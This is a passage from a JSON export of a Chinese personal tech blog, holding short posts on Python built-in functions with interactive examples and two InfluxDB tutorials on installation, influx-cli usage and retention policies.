isinstance('123', int)False&gt;&gt;&gt; isinstance('123', str)True II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2019/07/16/190716-Python-内置函数之isinstance/"},{"title":"190715 Python 内置函数之exec","text":"执行储存在字符串或文件中的 Python 语句，相比于 eval，exec可以执行更复杂的 Python 代码 举例如下: 123456&gt;&gt;&gt; exec('print(\"Hello World\")')Hello World&gt;&gt;&gt; exec('for i in range(0,3): print(i)')012 进阶 exec除了接收上面的python语句块之外，还可以接收表示全局和局部命名空间的参数 如 1234567891011121314151617&gt;&gt;&gt; x = 10&gt;&gt;&gt; expr = \"\"\"... z = 30... sum = x + y + z... print(sum)... \"\"\"&gt;&gt;&gt;&gt;&gt;&gt; def func():... y = 20... exec(expr)... exec(expr, {'x': 1, 'y': 2})... exec(expr, {'x': 1, 'y': 2}, {'y': 3, 'z': 4})...&gt;&gt;&gt; func()603334 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2019/07/15/190715-Python-内置函数之exec/"},{"title":"190716 Python 内置函数之len","text":"len()可以用来返回字符串，列表，字典，集合，元组等的长度or个数 1234&gt;&gt;&gt; len([1,2,3,4])4&gt;&gt;&gt; len('1sdfa')5 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2019/07/16/190716-Python-内置函数之len/"},{"title":"190716 Python 内置函数之input","text":"接收标准输入，返回String类型，用于与外界打交道 1234&gt;&gt;&gt; a = input('enter: ')enter: hello world&gt;&gt;&gt; a'hello world' II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2019/07/16/190716-Python-内置函数之input/"},{"title":"190716 Python 内置函数之iter","text":"iter主要用来生成迭代器，简单来讲就是可以将一个obj对象，生成迭代器，可以走for循环 1. case1注意：obj对象要求实现__iter__()或者__getitem__()方法 1234567891011121314&gt;&gt;&gt; class A:... def __init__(self):... self.a = [1, 2, 3, 4]... def __iter__(self):... return iter(self.a)...&gt;&gt;&gt; a = A()&gt;&gt;&gt; for i in iter(a):... print(i)...1234 2. case2此外，iter还可以接收第二个参数，这种场景下，第一个参数要求是可以调用的对象（如函数，实现了call方法的对象），第二个参数为终止信号，如 12345678910111213&gt;&gt;&gt; import random&gt;&gt;&gt; def m():... return random.choice(range(10))...# 当返回数据为4时，结束迭代&gt;&gt;&gt; for i in iter(m, 4):... print(i)...35729 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2019/07/16/190716-Python-内置函数之iter/"},{"title":"190716 Python 内置函数之issubclass","text":"判断参数class 是否是类型参数 classinfo 的子类。 1issubclass(class, classinfo) 请注意：两个参数必须都是类 这个比较好理解了，简单举例说明 12345678&gt;&gt;&gt; class A:... x = 10...&gt;&gt;&gt; class B(A):... y = 10...&gt;&gt;&gt; issubclass(B, A)True 如果我们需要判断一个对象的类型，则推荐使用上一篇介绍的isinstance()，如 12&gt;&gt;&gt; isinstance(B(), A)True II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2019/07/16/190716-Python-内置函数之issubclass/"},{"title":"190716 Python 内置函数之hex","text":"将数字转换为16进制 1234&gt;&gt;&gt; hex(255)'0xff'&gt;&gt;&gt; hex(-12)'-0xc' II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2019/07/16/190716-Python-内置函数之hex/"},{"title":"190716 Python 内置函数之map","text":"根据提供的函数，对传入的序列做映射 语法定义如下 1map(function, iterable, ...) function: 函数 iterable: 一个or多个序列 返回迭代器 实例如下 123456789&gt;&gt;&gt; list(map(lambda x: x ** 2, [1, 2, 3, 4, 5]))[1, 4, 9, 16, 25]&gt;&gt;&gt; for i in map(lambda x, y: x+y, [1,2,3], [10, 20, 30]):... print(i)...112233 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2019/07/16/190716-Python-内置函数之map/"},{"title":"190716 Python 内置函数之memoryview","text":"内存查看对象，是指对支持缓冲区协议的数据进行包装，返回元组列表 1234567&gt;&gt;&gt; memoryview(b'abc')&lt;memory at 0x10efa4348&gt;&gt;&gt;&gt; memoryview(b'ab')&lt;memory at 0x10efa44c8&gt;&gt;&gt;&gt; a = memoryview(b'ab')&gt;&gt;&gt; a[0]97 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2019/07/16/190716-Python-内置函数之memoryview/"},{"title":"190716 Python 内置函数之pow","text":"计算n次方 123456&gt;&gt;&gt; pow(4, 0.5)2.0&gt;&gt;&gt; pow(4, 2)16&gt;&gt;&gt; pow(100, -2)0.0001 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2019/07/16/190716-Python-内置函数之pow/"},{"title":"190716 Python 内置函数之min","text":"返回给定参数中的最小值 123456&gt;&gt;&gt; min(1,2,3)1&gt;&gt;&gt; min([1,2,3])1&gt;&gt;&gt; min([1,2,3], [4,3,2])[1, 2, 3] II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2019/07/16/190716-Python-内置函数之min/"},{"title":"190716 Python 内置函数之next","text":"返回迭代器的下一个元素 语法 1next(iterator[,default] iterator: 可迭代对象 default: 没有下一个元素时返回的默认值，不设置时，没有元素抛异常 实例 12345&gt;&gt;&gt; a = iter([1,2,3])&gt;&gt;&gt; next(a)1&gt;&gt;&gt; next(a)2 从上面的case，也可以大致看出它常配合while循环一起使用 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2019/07/16/190716-Python-内置函数之next/"},{"title":"190716 Python 内置函数之list","text":"将元组或字符串转换为列表 12345&gt;&gt;&gt; aTuple = (123, 'hello', {'a':123})&gt;&gt;&gt; list(aTuple)[123, 'hello', {'a': 123}]&gt;&gt;&gt; list('hello world')['h', 'e', 'l', 'l', 'o', ' ', 'w', 'o', 'r', 'l', 'd'] II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2019/07/16/190716-Python-内置函数之list/"},{"title":"190716 Python 内置函数之max","text":"返回给定参数中的最大值 1234&gt;&gt;&gt; max(1,2,3)3&gt;&gt;&gt; max([1,2,3], [4,2,1])[4, 2, 1] II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2019/07/16/190716-Python-内置函数之max/"},{"title":"190716 Python 内置函数之range","text":"返回可迭代的对象 语法 1range(start, stop[,step]) start: 默认从0开始 stop: 到stop结束，不包含stop step: 步长 举例 1234&gt;&gt;&gt; list(range(0, 10, 3))[0, 3, 6, 9]&gt;&gt;&gt; list(range(2))[0, 1] II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2019/07/16/190716-Python-内置函数之range/"},{"title":"190716 Python 内置函数之repr","text":"返回对象的string格式 123456789&gt;&gt;&gt; repr([1,2,3])'[1, 2, 3]'&gt;&gt;&gt; repr('bca')\"'bca'\"&gt;&gt;&gt; class A:... x = 10...&gt;&gt;&gt; repr(A())'&lt;__main__.A object at 0x10f079f98&gt;' II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2019/07/16/190716-Python-内置函数之repr/"},{"title":"190716 Python 内置函数之reversed","text":"返回一个反转的迭代器 12&gt;&gt;&gt; list(reversed([1,2,3]))[3, 2, 1] II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2019/07/16/190716-Python-内置函数之reversed/"},{"title":"190716 Python 内置函数之ord","text":"与前面介绍的chr配对，返回字unicode字符对应的ascii/unicode码 123456&gt;&gt;&gt; ord('a')97&gt;&gt;&gt; ord('灰')28784&gt;&gt;&gt; chr(28784)'灰' II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2019/07/16/190716-Python-内置函数之ord/"},{"title":"190717 Python 内置函数之setattr","text":"与 getattr对应，设置属性值（属性可以不存在） 1234567class A:... x = 10...&gt;&gt;&gt; a = A()&gt;&gt;&gt; setattr(a, 'b', 20)&gt;&gt;&gt; a.b20 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2019/07/17/190717-Python-内置函数之setattr/"},{"title":"190717 Python 内置函数之set","text":"创建一个无序不重复元素集 1234&gt;&gt;&gt; set([1,2,3,2,1]){1, 2, 3}&gt;&gt;&gt; set('hello'){'h', 'o', 'e', 'l'} 注意传参为可迭代对象 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2019/07/17/190717-Python-内置函数之set/"},{"title":"190717 Python 内置函数之slice","text":"切片，主要用于切片操作函数里的参数 语法 12slice(stop)slice(start, stop[,step] start: 开始位置 stop: 结束位置 step: 步长 举例 1234&gt;&gt;&gt; list(range(0, 10))[slice(4)][0, 1, 2, 3]&gt;&gt;&gt; list(range(0, 10))[slice(2, 8, 3)][2, 5] II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2019/07/17/190717-Python-内置函数之slice/"},{"title":"190716 Python 内置函数之oct","text":"整数转八进制，用法类似hex() 12&gt;&gt;&gt; oct(10)'0o12' II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2019/07/16/190716-Python-内置函数之oct/"},{"title":"190716 Python 内置函数之round","text":"返回浮点数 x 的四舍五入值，准确的说保留值将保留到离上一位更近的一端（四舍六入） 会有精度丢失，要求高的，不要用 123456&gt;&gt;&gt; round(2.674, 2)2.67&gt;&gt;&gt; round(2.675, 2)2.67&gt;&gt;&gt; round(2.6751, 2)2.68 注意，如果保留位的后一个为5时，需要再往后看一位，如果有，则进；没有则舍 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2019/07/16/190716-Python-内置函数之round/"},{"title":"190717 Python 内置函数之staticmethod","text":"修饰静态方法 1234567&gt;&gt;&gt; class A:... @staticmethod... def m():... return 10...&gt;&gt;&gt; A.m()10 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2019/07/17/190717-Python-内置函数之staticmethod/"},{"title":"190717 Python 内置函数之sorted","text":"对所有可迭代的对象进行排序 1. 语法1sorted(iterable, key=None, reverse=False) iterable: 可迭代对象 key: 用于比较排序的元素 reverse: True降序 False升序 返回排好序的列表 2. 实例12345678&gt;&gt;&gt; a = [1,3, 2, 9, 4]&gt;&gt;&gt; sorted(a)[1, 2, 3, 4, 9]&gt;&gt;&gt; a[1, 3, 2, 9, 4]&gt;&gt;&gt; a.sort()&gt;&gt;&gt; a[1, 2, 3, 4, 9] 注意：列表的sort()方法无返回直接作用于列表; sorted()有返回，原对象不变 123&gt;&gt;&gt; a=[('b',2),('a',1),('c',3),('d',4)]&gt;&gt;&gt; sorted(a, key=lambda x:x[1])[('a', 1), ('b', 2), ('c', 3), ('d', 4)] II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2019/07/17/190717-Python-内置函数之sorted/"},{"title":"190717 Python 内置函数之str","text":"将对象转化为字符串 12345678&gt;&gt;&gt; str([1,2,3])'[1, 2, 3]'&gt;&gt;&gt; str((1,'a'))\"(1, 'a')\"&gt;&gt;&gt; str({'a': 123, 'b': 456})\"{'a': 123, 'b': 456}\"&gt;&gt;&gt; str(b'hello')\"b'hello'\" II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2019/07/17/190717-Python-内置函数之str/"},{"title":"190717 Python 内置函数之super","text":"访问父类中的方法 12345678910111213141516171819202122&gt;&gt;&gt; class A:... def m(self):... return 'A'&gt;&gt;&gt; class B:... def m(self):... return 'B'...&gt;&gt;&gt; class C(A):... def m(self):... print(super().m())...&gt;&gt;&gt; C().m()A&gt;&gt;&gt; class D(A,B):... def m(self):... a = super(D, self).m()... print(a)...&gt;&gt;&gt; D().m()A 注意，在多继承时，会从左到右找匹配的方法，广度优先 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2019/07/17/190717-Python-内置函数之super/"},{"title":"190717-Influx Sql系列教程零：安装及influx-cli使用姿势介绍","text":"influxdb 时序数据库，因为实际业务中使用到了，然而并没有发现有特别好的文章，完整的介绍influx sql的使用姿势，因此记录下实际开发中学习的体会，主要参考来自于官方文档 Influx Query Language (InfluxQL) influx已经推出2.0beta版本，并没有使用，后面的所有都是以1.7版本进行说明 I. 安装安装教程，直接参考官网链接，installing-influxdb-oss，下面只介绍centos/macos两个操作系统的安装姿势 1. centos通过yum包管理方式实现安装最新的稳定版, 在终端中输入 12345678cat &lt;&lt;EOF | sudo tee /etc/yum.repos.d/influxdb.repo[influxdb]name = InfluxDB Repository - RHEL \\$releaseverbaseurl = https://repos.influxdata.com/rhel/\\$releasever/\\$basearch/stableenabled = 1gpgcheck = 1gpgkey = https://repos.influxdata.com/influxdb.keyEOF 然后就可以按照常见的yum方式进行安装 12345sudo yum install influxdb# 启动sudo service influxdb start# 7+ 版本可以使用 systemctl 方式启动sudo systemctl start influxdb 2. macosmac推荐通过homebrew方式进行安装，命令也比较简单 12brew updatebrew install influxdb 3. 相关配置一般安装完毕之后，如果作为测试的话，直接使用并没有啥问题；但是实际的成产环境中，铁定是需要修改默认配置的 如果需要开启权限校验，访问时需要用户名密码时，可以参考: 190505-InfluxDB之权限管理 如果需要修改数据的存储位置，访问端口号等，可以参考: 190506-InfluxDB之配置修改 II. influx-cli安装完毕之后，influx自带了一个控制台访问操作的工具: influx，在正式进入后面的influxsql之前，有必要了解一下这个工具如何使用，因为后面的sql，都是需要在它上面玩耍的 官方也给出了它的使用文档，有兴趣的可以参考: InfluxDB command line interface (CLI/shell) 1. 参数默认情况下，我们直接在控制台输入 influx 之后就可以进入与influxdb交互的终端界面，如果我们修改了influx的默认配置，比如增加了用户名/密码时，这个时候可能需要使用参数来链接到influxdb了 下面给出几个常用的参数 参数 示例 说明 -username admin 配置访问用户名 -password admin 配置访问密码 -format json csv column 格式化输出结果 -host localhost influxdb提供访问的域名或ip -port 8086 influxdb提供访问的端口号 -precisoin rfc3339(h,m,s,ms,u,ns) 指定time时间戳格式化 一个简单的使用case如下 2. 使用示例上面的参数是在连接的时候直接指定了，这些参数在连接之后，也是可以再指定的，下面给出以下常用的使用姿势 a. help直接输入help，会给出一些命令提示 b. auth因为直接使用前面的方式输入用户名和密码的方式，并不安全，所以推荐的方式是直接influx进去之后，使用auth来权限校验，这种思路和redis-cli的差不多 c. pretty是输出更加友好的方式，配合-format=json的时候比较合适 注意pretty输入一次表示开启，再输入一次表示关闭 d. precision时间戳格式化，对人更友好的显示方式 直接输入: precision rfc3339 e. historyinflux-cli会保存历史命令（不包括auth），所以可以通过输入这个来查询之前的命令 f. 退出三种方式 1exit/quit/ctrl+d quits the influx shell II. 其他0. 系列博文 190509-InfluxDb之时间戳显示为日期格式 190506-InfluxDB之配置修改 190505-InfluxDB之权限管理 180727-时序数据库InfluxDB之备份和恢复策略 180726-InfluxDB基本概念小结 180725-InfluxDB-v1.6.0安装和简单使用小结 以上内容主要参考自官方文档: installing-influxdb-oss InfluxDB command line interface (CLI/shell) Influx Query Language (InfluxQL) 1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2019/07/17/190717-Influx-Sql系列教程零：安装及influx-cli使用姿势介绍/"},{"title":"190717 Python 内置函数之sum","text":"求和 12&gt;&gt;&gt; sum([1,2,3])6 注意：传参为可迭代对象 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2019/07/17/190717-Python-内置函数之sum/"},{"title":"190717 Python 内置函数之vars","text":"返回对象object的属性和属性值的字典对象 123456&gt;&gt;&gt; class A:... x = 10... y = 20...&gt;&gt;&gt; vars(A)mappingproxy({'__module__': '__main__', 'x': 10, 'y': 20, '__dict__': &lt;attribute '__dict__' of 'A' objects&gt;, '__weakref__': &lt;attribute '__weakref__' of 'A' objects&gt;, '__doc__': None}) II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2019/07/17/190717-Python-内置函数之vars/"},{"title":"190717 Python 内置函数之tuple","text":"将可迭代系列（如列表）转换为元组 1234&gt;&gt;&gt; tuple([1,2,3])(1, 2, 3)&gt;&gt;&gt; tuple({'a': 1, 'b': 2})('a', 'b') II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2019/07/17/190717-Python-内置函数之tuple/"},{"title":"190717 Python 内置函数之type","text":"返回参数类型 type: 不认为子类与父类类型相同 isinstance: 子类是一种父类类型 语法 12type(object)type(name, bases, dict) 上面两种用法表示的含义不同 一个参数：返回对象类型 三个参数：根据定义返回一个新的类型对象 name 类名 bases 父类 dict 字典 实例 12345678910111213&gt;&gt;&gt; type('str')&lt;class 'str'&gt;&gt;&gt;&gt; type(b'123')&lt;class 'bytes'&gt;&gt;&gt;&gt; type('123')&lt;class 'str'&gt;&gt;&gt;&gt; x = type('x', (object,), dict(a=1))&gt;&gt;&gt; x&lt;class '__main__.x'&gt;&gt;&gt;&gt; a = x()&gt;&gt;&gt; a.a1 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2019/07/17/190717-Python-内置函数之type/"},{"title":"190717 Python 内置函数之zip","text":"接收一个or多个迭代器，将对象中对应的元素打包成一个个元组，如果各个迭代器的元素个数不一致，则返回列表长度与最短的对象相同 1234567&gt;&gt;&gt; list(zip([1,2,3], ['a', 'b', 'c']))[(1, 'a'), (2, 'b'), (3, 'c')]&gt;&gt;&gt; list(zip([1,2,3], ['a', 'b', 'c'], ['!', \"@\"]))[(1, 'a', '!'), (2, 'b', '@')]&gt;&gt;&gt; list(zip(*[(1, 4), (2, 5), (3, 6)]))[(1, 2, 3), (4, 5, 6)] 说明：借助*可以将zip打包的元组解压为之前的数据 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2019/07/17/190717-Python-内置函数之zip/"},{"title":"190719-Influx Sql系列教程二：retention policy 保存策略","text":"retention policy这个东西相比较于传统的关系型数据库(比如mysql)而言，是一个比较新的东西，在将表之前，有必要来看一下保存策略有什么用，以及可以怎么用 I. 基本操作1. 创建retention policyretention policy依托于database存在，也就是说保存策略创建时，需要指定具体的数据库，语法如下 1CREATE RETENTION POLICY &lt;retention_policy_name&gt; ON &lt;database_name&gt; DURATION &lt;duration&gt; REPLICATION &lt;n&gt; [SHARD DURATION &lt;duration&gt;] [DEFAULT] 创建语句中，有几个地方需要额外注意一下 retention_policy_name: 策略名（自定义的） database_name: 一个必须存在的数据库名 duration: 定义的数据保存时间，最低为1h，如果设置为0，表示数据持久不失效（默认的策略就是这样的） REPLICATION: 定义每个point保存的副本数，默认为1 default: 表示将这个创建的保存策略设置为默认的 下面是一个实际的case，创建一个数据保存一年的策略 1create retention policy \"1Y\" on test duration 366d replication 1 2. 策略查看上面演示的case中，已经有如何查看一个数据库的保存策略了 1show retention policies on &lt;database name&gt; 3. 修改保存策略修改一个已经存在的保存策略，语法如下 1ALTER RETENTION POLICY &lt;retention_policy_name&gt; ON &lt;database_name&gt; DURATION &lt;duration&gt; REPLICATION &lt;n&gt; SHARD DURATION &lt;duration&gt; DEFAULT 